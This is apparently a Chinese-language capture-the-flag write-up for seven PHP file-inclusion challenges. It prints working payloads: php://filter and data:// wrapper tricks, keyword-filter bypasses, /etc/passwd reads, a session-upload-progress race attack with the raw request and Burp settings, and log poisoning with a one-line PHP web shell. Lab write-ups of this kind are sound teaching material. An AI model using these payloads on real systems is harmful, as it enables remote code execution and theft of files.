---

title: 青岑CTF文件包含wp
date: 2026-07-21
categories: ["CTF-Writeups","青岑CTF-WP集"]
permalink: /ctf-writeups/ctf-file-include
---


# 1.EZFL
![](/images/20260420215603.webp)
我们随便点一下旁边的文件，发现url一直有个file，就想到了文件包含，直接查看源码后发现这个
![](/images/20260420221204.webp)
base64解码后是flag is in /flag.txt
# 2.EZFL1
![](/images/20260420221609.webp)
和上一题一样，直接查看源码
![](/images/20260420221642.webp)
base64解码后**The flag is right in flag.php, but you'll never be able to see it.**翻译是flag 就在 flag.php 里，但你永远无法看到它。
伪协议：?file=php://filter/read=convert.base64-encode/resource=flag.php
后得到![](/images/20260420222157.webp)
base64解码后拿到flag


# 3.EZFL2
![](/images/20260420222412.webp)
和上一题一样
<!-- include($file); -->
<!-- VGhlIGZsYWcgaXMgcmlnaHQgaW4gZmxhZy5waHAsIGJ1dCB5b3UnbGwgbmV2ZXIgYmUgYWJsZSB0byBzZWUgaXQuIA== -->
解码后也一样，?file=php://filter/read=convert.base64-encode/resource=flag.php，不过得到的是no way
于是换个编码试试?file=php://filter/convert.iconv.utf-8.utf-16/resource=flag.php，拿到flag

# 4.EZFL3
![](/images/20260420225143.webp)
和之前一样，依旧查看页面源码，<!-- include($file); --> <!-- VGhlcmUgYXJlIG5vIG1vcmUgaGludHMgZm9yIHlvdSwga2lkLiBGcm9tIG5vdyBvbiwgeW91IGhhdmUgdG8gcmVseSBvbiB5b3Vyc2VsZi4= -->
不过这次base64解码是**There are no more hints for you, kid. From now on, you have to rely on yourself.**翻译就是:不再给你更多提示了，孩子。从现在起，你得靠自己了。** 
当然一头雾水，查看之前的笔记，想到可以使用file:///etc/passwd来查看本地文件![](/images/20260421183227.webp)
我们可以尝试查看源码找线索

```bash
/?file=php://filter/read=convert.base64-encode/resource=index.php
```
base64解码后，发现了隐藏的php代码
```bash
<?php
error_reporting(0);
$file = isset($_GET['file']) ? $_GET['file'] : 'pages/home.php';
?>
<?php
include($file);   // ← 直接包含，没有任何过滤！
?>
```
尝试使用data://执行代码查找flag

```bash
/?file=data://text/plain,<?php system('find / -name "flag*" 2>/dev/null');?>
```
![](/images/20260421185408.webp)
很多，我们找到了flag在flag-mZXg2wdHqRagAiDBzopwfEd4ymaOiN.txt
```bash
/?file=file:///flag-mZXg2wdHqRagAiDBzopwfEd4ymaOiN.txt
```

# 5.EZFL4
和上一题一样，先读取源码
```bash
/?file=php://filter/read=convert.base64-encode/resource=index.php
```
结果回显php not allow；所以关键字php被过滤了，尝试了很多方法
，最后使用了php特性，通过拼接字符串来读取内容；（或使用ASCII码拼接/?file=data://text/plain,<?=show_source(chr(102).chr(108).chr(97).chr(103).chr(46).chr(112).chr(104).chr(112));?> show_source()可以直接读取页面的内容）
```bash
/?file=data://text/plain,<?=file_get_contents('flag.p'.'hp');?>
```
（注：这个方法的确能拿到flag，但是我是在页源码界面输的，即
```bash
view-source:http://docker.qingcen.net:43040/?file=data://text/plain,%3C?=file_get_contents(%27flag.p%27.%27hp%27);?%3E ）
```
# 6.EZFL5
和上一题一样，读取源码的时候显示php not allow；所以关键字php被过滤了，同样使用php特性，结果回显data not allowed；所以data；//也被过滤了。查了一下资料，可以使用日志文件包含，不过`/var/log/apache2/access.log` 无读取权限，所以日志文件包含也没有希望了，还好天无绝人之路，`/tmp/sess_<SESSION_ID>` 不含 `php` 字符。
##### 方法：PHP_SESSION_UPLOAD_PROGRESS 利用
**原理**：PHP 默认开启 `session.upload_progress.enabled`，当有文件上传时，会自动在 `/tmp/` 目录下创建 `sess_<SESSION_ID>` 会话文件，其中包含上传进度信息。
######  Step 1： 设置固定Session ID
**目的**：让session文件名可预测（`/tmp/随便取个名字（下面以`sess_minimax为例）`）
1. 在Burp **Proxy** → **Options** → **Match and Replace**
2. 点击 **Add**，添加规则：
    - **Type**: Request header
    - **Match**: `Cookie: PHPSESSID=.*`
    - **Replace**: `Cookie: PHPSESSID=minimax`
    - **Regex match**: ✅ 勾选
3. 这样所有经过Burp的请求都会自动替换为固定Session ID
######  Step 2:构造恶意上传请求
**目标**：让PHP Session文件包含我们的恶意代码
在页面找一个文件上传点（如果没有，直接用任意POST请求也可以）
手动构造POST请求：
```bash
POST / HTTP/1.1
Host: docker.qingcen.net:43128
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: PHPSESSID=minimax
Content-Length: 265

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system('cat /var/www/html/flag.php');?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="a.txt"
Content-Type: text/plain

test
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
###### Step 3：竞争条件攻击
**Intruder多线程并发**
**配置上传请求（Intruder）**：
1. **Positions** 标签：清除所有Payload标记（不需要变量）
2. **Payloads** 标签：
- Payload type: **Null payloads**
- Payload options: 无限发送
1. **Options** 标签：
- Number of threads: **20**
- Request timeout: **500**
**配置包含请求（第二个Intruder）**：
手动构造LFI请求：
```bash
GET /?file=../../../../../tmp/sess_minimax HTTP/1.1
Host: docker.qingcen.net:43128

Cookie: PHPSESSID=minimax
```
payload的配置和上传请求一样。
**同时启动两个Intruder攻击**：
1. 先启动**上传Intruder**（让session文件不断被创建）
2. 紧接着启动**包含Intruder**（不断尝试包含session文件）
3. 在包含Intruder的 **Results** 中搜索 `flag{` 或观察响应长度异常
![[ctf_writeup.txt]]
（这是ai的脚本wp）
后来看了康神的wp，他是使用php大写绕过和PHP://input来解
![[5f6a658b7051f0441fcc4bf569d439b2.png]]
**还得是康神！！！！！！！！！！！！**
# 7.EZFL6
试了之前所有的方法均无用，于是就尝试了一下目录穿越?file=../../../../../flag.txt竟然拿到了flag？？？？？？？真的懵逼了，感觉是出题人疏忽了。问了管理员才知道是后台没有后进行保护，于是又开启了漫长的找flag之路
看看日志是能访问的，所以应该就是日志泄露了。
hackbar V2好像可以直接注入一句话说木马
```bash
<?php system('cat /flag.txt');?>
```
然后查看
```bash
/?file=../../../../../var/log/nginx/access.log
```
就能拿到flag了。
